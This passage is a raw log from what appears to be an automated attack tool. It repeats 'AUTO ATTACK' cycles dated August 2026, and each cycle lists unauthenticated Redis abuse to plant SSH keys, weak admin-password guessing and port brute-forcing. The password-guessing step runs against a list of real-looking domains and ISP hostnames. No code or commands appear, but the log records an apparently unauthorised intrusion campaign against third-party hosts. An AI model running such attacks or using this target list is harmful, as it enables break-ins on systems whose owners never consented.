  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2grafik.com
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 16:50:39 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 17:42:33 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 17:43:22 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 17:51:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 17:52:37 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 18:40:53 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 18:41:41 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 18:50:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 18:51:12 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 19:40:46 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 19:41:37 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 19:50:28 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 19:51:12 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 20:38:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 20:39:41 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 20:45:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 20:46:08 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 21:39:01 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 21:39:43 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 21:49:25 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 21:50:06 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 22:39:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 22:40:32 UTC 2026 ===
=== AUTO ATTACK Mon Aug 10 22:49:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Mon Aug 10 22:50:30 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 00:14:20 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 00:15:14 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 01:03:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 01:04:50 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 01:08:30 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 01:09:28 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 01:48:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 01:49:01 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 01:51:12 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 01:52:03 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 02:50:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 02:50:55 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 02:56:15 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 02:57:01 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 03:50:24 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 03:51:07 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 03:55:19 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 03:55:59 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 04:50:06 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 04:50:53 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 04:55:23 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 04:56:05 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 07:04:49 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 07:05:51 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 07:06:29 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2va.thesaris.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 07:07:28 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 09:50:36 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2d.ciftis.org
[3] port brute
=== AUTO ATTACK END Tue Aug 11 09:51:45 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 13:11:48 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
  admin 1xbet-br.org
  admin 2d.ciftis.org
[3] port brute
=== AUTO ATTACK END Tue Aug 11 13:13:19 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 16:14:14 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 137994-app2.xbux.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180.wecare.net
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 16:15:21 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 19:11:38 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 137994-app2.xbux.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180.wecare.net
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 19:12:54 UTC 2026 ===
=== AUTO ATTACK Tue Aug 11 22:11:57 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 137994-app2.xbux.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180.wecare.net
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
[3] port brute
=== AUTO ATTACK END Tue Aug 11 22:13:08 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 01:12:41 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 11ban.top
  admin 137994-app2.xbux.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180.wecare.net
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
  admin 1betvegas.com
  admin 1minutereview.org
  admin 1pp3r.vygroup.cn
  admin 1win345.com
  admin 1www.datalawn.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 01:13:53 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 04:13:55 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 04:14:59 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 07:14:37 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 07:15:23 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 09:56:00 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 10:06:11 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 15:01:16 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 15:02:04 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 19:33:10 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 19:33:52 UTC 2026 ===
=== AUTO ATTACK Wed Aug 12 23:14:27 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Wed Aug 12 23:15:18 UTC 2026 ===
=== AUTO ATTACK Thu Aug 13 03:59:14 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Thu Aug 13 04:00:38 UTC 2026 ===
=== AUTO ATTACK Thu Aug 13 12:26:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Thu Aug 13 12:28:43 UTC 2026 ===
=== AUTO ATTACK Thu Aug 13 16:29:43 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Thu Aug 13 16:30:27 UTC 2026 ===
=== AUTO ATTACK Thu Aug 13 21:55:59 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Thu Aug 13 21:56:40 UTC 2026 ===
=== AUTO ATTACK Fri Aug 14 01:57:17 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Fri Aug 14 01:58:12 UTC 2026 ===
=== AUTO ATTACK Fri Aug 14 06:10:09 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
  admin 11ban.top
  admin 169.j3m4s.zymzs.com
  admin 177-210-157-110.user3g.veloxzone.com
  admin 177-211-78-41.user3g.veloxzone.com
  admin 180zhanshenhejiwang.99999g.com
  admin 186-244-6-206.user.veloxzone.com
  admin 191-214-157-88.user3g.veloxzone.com
[3] port brute
=== AUTO ATTACK END Fri Aug 14 06:11:04 UTC 2026 ===
=== AUTO ATTACK Fri Aug 14 10:05:36 UTC 2026 ===
[1] Redis unauth -> ssh key
[2] admin weak pass
  admin 000win345.com
  admin 0do.net
  admin 1148d2.com
  admin 1148d6.com
  admin 1148d7.com
  admin 1148d8.com
  admin 1148h6.com
  admin 1148h7.com
